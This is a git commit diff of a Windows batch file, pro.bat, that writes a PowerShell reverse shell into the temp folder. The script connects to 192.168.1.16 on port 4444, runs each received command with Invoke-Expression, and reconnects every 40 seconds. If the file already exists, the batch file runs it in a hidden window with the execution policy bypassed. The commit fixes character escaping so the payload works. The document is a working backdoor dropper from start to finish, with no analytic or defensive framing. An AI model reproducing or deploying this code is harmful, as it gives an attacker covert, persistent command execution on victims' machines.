f65c5855ceaa713a5e6847e345ad6966479ff9e5
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-13 08:47:08 +0300

    Update pro.bat

--- pro.bat
+++ pro.bat
@@ -6,53 +6,53 @@ if not exist %FILE% (
         echo $ip = "192.168.1.16"
         echo $port = 4444
         echo.
-        echo while ($true) {
-        echo      try {
-        echo          $client = New-Object System.Net.Sockets.TcpClient($ip, $port)
-        echo          $stream = $client.GetStream()
-        echo          $writer = New-Object System.IO.StreamWriter($stream)
-        echo          $reader = New-Object System.IO.StreamReader($stream)
+        echo while ^($true^) ^{
+        echo      try ^{
+        echo          $client = New-Object System.Net.Sockets.TcpClient^($ip, $port^)
+        echo          $stream = $client.GetStream^(^)
+        echo          $writer = New-Object System.IO.StreamWriter^($stream^)
+        echo          $reader = New-Object System.IO.StreamReader^($stream^)
         echo.
-        echo          function Execute-Command {  
-        echo               param([string]$cmd)
+        echo          function Execute-Command ^{  
+        echo               param^([string]$cmd^)
         echo.
         echo               $output = $errorOutput = $null
         echo. 
-        echo               try {                
+        echo               try ^{                
         echo                    $output = Invoke-Expression -Command $cmd
-        echo               } catch { 
+        echo               ^} catch ^{ 
         echo                   $errorOutput = $_.Exception.Message
-        echo               }
+        echo               ^}
         echo.        
         echo               return $output, $errorOutput
-        echo          }        
+        echo          ^}        
         echo.                
-        echo          while ($true) {          
-        echo              $prompt = (Get-Location).Path + "> "
-        echo              $writer.Write($prompt)
-        echo              $writer.Flush()          
+        echo          while ^($true^) ^{          
+        echo              $prompt = ^(Get-Location^).Path + "> "
+        echo              $writer.Write^($prompt^)
+        echo              $writer.Flush^(^)          
         echo.
-        echo              $command = $reader.ReadLine()
+        echo              $command = $reader.ReadLine^(^)
         echo.
-        echo              if ($command -eq "exit") {            
+        echo              if ^($command -eq "exit"^) ^{            
         echo                  break
-        echo              }
+        echo              ^}
         echo.                   
         echo              $output, $errorOutput = Execute-Command -cmd $command
         echo.               
-        echo              $writer.WriteLine($output -join "`n")
-        echo              $writer.WriteLine($errorOutput)
-        echo              $writer.Flush()
-        echo           }   
-        echo        } catch {
+        echo              $writer.WriteLine^($output -join "`n"^)
+        echo              $writer.WriteLine^($errorOutput^)
+        echo              $writer.Flush^(^)
+        echo           ^}   
+        echo        ^} catch ^{
         echo.    
-        echo        } finally {
-        echo            $client.Close()
-        echo        }
+        echo        ^} finally ^{
+        echo            $client.Close^(^)
+        echo        ^}
         echo. 
         echo.    
         echo        Start-Sleep -Seconds 40
-        echo    }    
+        echo    ^}    
     ) > %FILE%
 ) else (
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%temp%\sh.ps1"
